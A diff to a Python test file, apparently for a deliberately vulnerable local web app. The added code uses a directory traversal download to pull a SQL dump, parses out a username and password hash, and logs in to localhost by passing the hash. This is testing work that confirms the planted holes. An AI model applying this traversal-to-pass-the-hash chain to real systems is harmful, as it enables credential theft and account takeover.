@@ -46,6 +46,18 @@ def send_file_appointment(filename):
     return url, cookies
 
 
+def convert(test_str):
+    res = []
+    temp = []
+    for token in test_str.split(","):
+        num = str(token.replace("(", "").replace(")", ""))
+        temp.append(num)
+        if ")" in token:
+            res.append(tuple(temp))
+            temp = []
+    return res
+
+
 class TestPassTheHashVuln(unittest.TestCase):
     def test_pth(self):
         obj = {
@@ -87,6 +99,19 @@ class TestDirectoryTraversal(unittest.TestCase):
         url, cookies = send_file_appointment(filename)
 
         download = rq.get(url, allow_redirects=True, cookies=cookies)
+        sql_string = download.content[27:-2].decode('ascii')
+        user_list = convert(sql_string)
+        print(user_list)
+        user = (user_list[0][1])[1:-1]
+        hash = (user_list[0][2])[2:]
+        obj = {
+            'username': user,
+            'password': base64.b64encode(
+                bytes.fromhex(hash)).decode('ascii'),
+            'login': 'signin'
+        }
+        req = rq.post('http://localhost:6597/login', data=obj)
+        self.assertEqual(200, req.status_code)
 
 
 
